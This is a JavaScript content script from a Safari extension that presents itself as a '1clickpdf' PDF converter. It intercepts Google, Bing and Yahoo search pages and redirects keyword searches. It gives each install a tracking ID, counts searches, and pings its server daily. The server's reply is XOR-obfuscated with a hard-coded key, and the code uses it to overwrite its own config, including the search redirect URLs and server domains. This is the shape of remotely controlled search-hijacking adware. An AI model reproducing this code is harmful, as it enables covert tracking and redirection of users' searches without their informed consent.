var debugging = true;

var Store = {
getItem: function(key) {
    var jsonString = localStorage.getItem('__' + key);
    if (jsonString) {
        var data = JSON.parse(jsonString);
        return data;
    }
},
setItem: function(key, data) {
    var jsonString = JSON.stringify(data);
    localStorage.setItem('__' + key, jsonString);
    return;
},
setCheckItem: function(key, data) {
    if (localStorage.getItem('__' + key) !== null) {
        return 0;
    }
    Store.setItem(key, data);
    return 1;
},
removeItem: function(key) {
    localStorage.removeItem('__' + key);
    return;
},
each: function(fn) {
    for (var keyword in localStorage) {
        if (keyword.substr(0, 2) == '__') {
            var data = Store.getItem(keyword.substr(2));
            fn(data);
        }
    }
    return;
},
clear: function() {
    localStorage.clear();
    return;
}
};

var keys = {
storage: '1clickpdf',
pdf_search: 'https://www.google.com/search?q=filetype%3Apdf&{searchTerms}',
omni_search: 'https://www.google.com/search?q={searchTerms}',
    //omni_search: 'https://www.bing.com/search?q={searchTerms}',
random: '849OQQ106&$kBDaN0iYPvyOlnCsXisi^',
ver: safari.extension.bundleVersion,
os: navigator.appVersion.indexOf('Mac') != -1 ? 'mac' : 'win',
country: '',
report: true,
ping: {
check: (debugging ? 1 : 5) * 60 * 1000, // check every x minutes
send: (debugging ? 0.1 : 24) * 60 * 60 * 1000, // send if passed more than x hours from last ping
},
domains: {
main: 'https://1clickpdf.com',
ping: 'https://1clickpdf.com',
report: 'https://1clickpdf.com',
save: 'https://1clickpdf.com',
search: 'https://1clickpdf.com',
typ: 'https://1clickpdf.com',
},
persistant: true,
keywords: ['pdf', 'convert'],
};

var storage = {
user_id: '',
counter: 0,
l_ping: 0,
timestamp: 0,
version: 0,
encoded: '',
};
var urls = {
typ: function() {
    return keys.domains.typ + '/thankyou?uid=' + storage.user_id + '&o=' + keys.os + '&v=' + keys.ver;
},
ping: function() {
    return keys.domains.ping + '/ping?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
    '&gl=' + keys.country + '&v=' + keys.ver;
},
report: function(keyword) {
    return keys.domains.report + '/report?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) +
    '&o=' + keys.os + '&gl=' + keys.country + '&v=' + keys.ver;
},
save: function() {
    return keys.domains.save + '/save/' + storage.user_id + '?c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
    '&gl=' + keys.country + '&v=' + keys.ver;
},
uid: function() {
    return keys.domains.save + '/uid';
}
};
var XOR = {
utf8ToBinaryString: function(str) {
    var escstr = encodeURIComponent(str);
    // replaces any uri escape sequence, such as %0A,
    // with binary escape, such as 0x0A
    var binstr = escstr.replace(/%([0-9A-F]{2})/g, function(match, p1) {
                                return String.fromCharCode(parseInt(p1, 16));
                                });
    return binstr;
},
binaryStringToUtf8: function(binstr) {
    var escstr = binstr.replace(/(.)/g, function(m, p) {
                                var code = p.charCodeAt(0).toString(16).toUpperCase();
                                if (code.length < 2) {
                                code = '0' + code;
                                }
                                return '%' + code;
                                });
    return decodeURIComponent(escstr);
},
utf8ToBase64: function(str) {
    var binstr = this.utf8ToBinaryString(str);
    return btoa(binstr);
},
base64ToUtf8: function(b64) {
    var binstr = atob(b64);
    return this.binaryStringToUtf8(binstr);
},
encode: function(key, data) {
    return this.utf8ToBase64(this.xorStrings(key, JSON.stringify(data)));
},
decode: function(key, data) {
    data = this.base64ToUtf8(data);
    return JSON.parse(this.xorStrings(key, data));
},
xorStrings: function(key, input) {
    var output = '';
    for (var i = 0; i < input.length; i++) {
        var c = input.charCodeAt(i);
        var k = key.charCodeAt(i % key.length);
        output += String.fromCharCode(c ^ k);
    }
    return output;
},
};


function getExtensionAge(unit, places) {
    unit = typeof unit === 'undefined' ? 'days' : unit;
    places = typeof places === 'undefined' ? 2 : places;
    var age = new Date().getTime() - storage.timestamp;
    
    switch (unit) {
        case 'seconds':
            age = age / 1000;
            break;
        case 'minutes':
            age = age / 1000 / 60;
            break;
        case 'hours':
            age = age / 1000 / 60 / 60;
            break;
        case 'days':
            age = age / 1000 / 60 / 60 / 24;
            break;
    }
    
    return age.toFixed(places);
}

console.log(location.href);

safari.self.addEventListener("message", handleMessage);
//if(location.href.indexOf('q=Hello') < 0){
//    refresh();
//}

if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=APMCS1')> -1)) ||
   ((location.href.indexOf('www.google') > -1) && (location.href.indexOf('/search?client=safari')> -1)) ||
   (((location.href.indexOf('www.yahoo') > -1) || (location.href.indexOf('search.yahoo') > -1)) && (location.href.indexOf('/search?ei=utf-8&fr=aaplw&p=')> -1)) )
{
	console.log("Step1");
    if(location.href.indexOf('q=Hello') < 0){
//        window.stop();
//        refresh();
    }
    
//        window.stop();
//    onBeforeSearch()

	console.log(document.URL);
	var newurl = document.URL;
	safari.extension.dispatchMessage(newurl);
//    onBeforeSearch(document);
	
}
if(location.href.indexOf('convert.html') < 0 && (location.href.indexOf('filetype:pdf') < 0)){
    onBeforeSearch();
}

function refresh() {
    
//    window.location.href = "https://www.google.com/search?client=safari&rls=en&q=Hello&ie=UTF-8&oe=UTF-8";
//     window.location.reload(true);
//    var url = location.origin;
//    var pathname = location.pathname;
//    var hash = location.hash;
//    location.href = "https://www.google/search?client=safari/?q=hello"
//    location = url + pathname + '?application_refresh=' + (Math.random() * 100000) + hash;
}

function handleMessage(event) {
//    onBeforeSearch(event)
//    console.log(event.name);
//    var urhell = event.name;
//    var newUrl = "";
//    console.log("Holy Step1");
//    if( urhell.indexOf('tagSearchQuery') > 0)
//    {
//        console.log("Holy Step2");
//        event.preventDefault();
//        newUrl = urhell.replace("tagSearchQuery","");
//        console.log(newUrl);
//        window.location.href = newUrl;
//
//    }

    console.log(newUrl);
}

function SendRequest(url, callback_body, callback_headers) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if (xhr.status >= 200 && xhr.status < 400) {
                if (callback_body) {
                    callback_body(xhr.responseText);
                }
                if (callback_headers) {
                    callback_headers(xhr.getAllResponseHeaders());
                }
            } else {
                console.log('xhr status error: ' + xhr.statusText);
            }
        }
    };
    xhr.onerror = function(e) {
        console.log('xhr error: ' + xhr.statusText);
    };
    xhr.send();
}


function RandomString(pre) {
    var text = '';
    var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    
    for (var i = 0; i < 8; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return pre + text;
}

function Decode(encoded) {
    if (typeof encoded != 'undefined' && encoded !== '') {
        try {
            var decoded = XOR.decode(keys.random, encoded);
            log('decoded: ' + JSON.stringify(decoded));
            Object.keys(decoded).forEach(function(key, index) {
                                         if (typeof decoded[key] !== null && typeof decoded[key] === 'object') {
                                         Object.keys(decoded[key]).forEach(function(key1, index1) {
                                                                           if (typeof decoded[key][key1] !== null) {
                                                                           keys[key][key1] = decoded[key][key1];
                                                                           }
                                                                           });
                                         } else {
                                         keys[key] = decoded[key];
                                         }
                                         });
        } catch (err) {
            console.log('decode error: ' + err.message);
        }
    }
}

function getExtensionAge(unit, places) {
    unit = typeof unit === 'undefined' ? 'days' : unit;
    places = typeof places === 'undefined' ? 2 : places;
    var age = new Date().getTime() - storage.timestamp;
    
    switch (unit) {
        case 'seconds':
            age = age / 1000;
            break;
        case 'minutes':
            age = age / 1000 / 60;
            break;
        case 'hours':
            age = age / 1000 / 60 / 60;
            break;
        case 'days':
            age = age / 1000 / 60 / 60 / 24;
            break;
    }
    
    return age.toFixed(places);
}

function Reach24h(force) {
    // Background Heartbeat ping every 24 hours
    var lping = storage.l_ping;
    var now = new Date().getTime();
    if (!lping || (typeof force !== 'undefined' && force === true)) {
        // first run, have not ping yet
        PingServer(now);
    } else {
        var time_elapsed = now - lping;
        if (time_elapsed >= keys.ping.send) {
            PingServer(now);
        }
    }
    setTimeout(Reach24h, keys.ping.check); // Check ping after each 5mins
}

function PingServer(now) {
    var age = getExtensionAge('days', 2);
    SendRequest(urls.ping(),
                function(ret) {
                if (ret !== '') {
                log('ping payload: ' + ret);
                Decode(ret);
                if (keys.persistant) {
                storage.encoded = ret;
                }
                }
                },
                function(headers) {
                var regex = /X-Country:\s*([A-Z]{2})/gi;
                var match = regex.exec(headers);
                if (Array.isArray(match)) {
                keys.country = match.pop();
                log('ping country: ' + keys.country);
                }
                }
                );
    storage.l_ping = now;
    Store.setItem(keys.storage, storage);
    console.log('Ping sent at ' + new Date(now));
}


function storageIsInitiated() {
    if (storage.timestamp === 0) {
        storage.timestamp = new Date().getTime();
    }
    
    if (storage.version != keys.ver) {
        storage.version = keys.ver;
    }
    
    if (storage.encoded != '') {
        Decode(storage.encoded);
    }
    
    var new_install = true;
    if (storage.user_id === '') {
        storage.user_id = RandomString('1pdf');
        console.log('generated userid: ' + storage.user_id);
    } else {
        new_install = false;
        console.log('retrieved from storage userid: ' + storage.user_id);
    }
//    openNewTabWithUrl(urls.typ())
    Store.setItem(keys.storage, storage);
    
//    safari.application.addEventListener('beforeSearch', onBeforeSearch, true);
//    safari.application.addEventListener('message', handleMessage, true);
    if (new_install) {
        console.log('New Install: ' + urls.typ());
        openNewTabWithUrl(urls.typ())
        new_install = false
//        safari.application.activeBrowserWindow.openTab().url = urls.typ();
    }
    Reach24h(true);
}

function openNewTabWithUrl(url) {
    console.log('openNewTabWithUrl: ' + url);
 
    safari.extension.dispatchMessage("open_new_tab",{"url":url});
    //            safari.self.tab.dispatchMessage("open_new_tab", url);
}


function Init() {
    var tmp_storage = Store.getItem(keys.storage);
    if (tmp_storage && tmp_storage != null) {
        storage = tmp_storage;
        console.log('retrieved storage object: ' + JSON.stringify(tmp_storage));
    }
    storageIsInitiated();
}

Init();

function onBeforeSearch() {
    var searchUrl;
    let params = (new URL(document.location)).searchParams;
    var searchKeyword = params.get("q");
    var searchTerms = document.location.search;
    if (searchKeyword == null){
        searchKeyword = ""
    }
    var semi_pos = document.location.href.indexOf(':');
    if (keys.keywords.indexOf(searchKeyword.toLowerCase().trim()) !== -1) {
        window.stop();
        searchUrl = safari.extension.baseURI + 'convert.html';
            window.location.href = searchUrl;
    }
    else if ( true == searchKeyword.startsWith("pdf")){
        window.stop();

        searchUrl = keys.pdf_search.replace(/\{searchTerms\}/g, ("q="+searchKeyword));
            window.location.href = searchUrl;
    } else {
        searchUrl = keys.omni_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms));
        storage.counter++;
        setTimeout(function() {
                   if (keys.report === true) {
                   SendRequest(urls.report(searchTerms), function(ret) {
                               console.log('reporting enabled: ' + searchTerms);
                               });
                   }
                   }, 50);
        Store.setItem(keys.storage, storage);
    }
    console.log('searchUrl: ' + searchUrl);

}


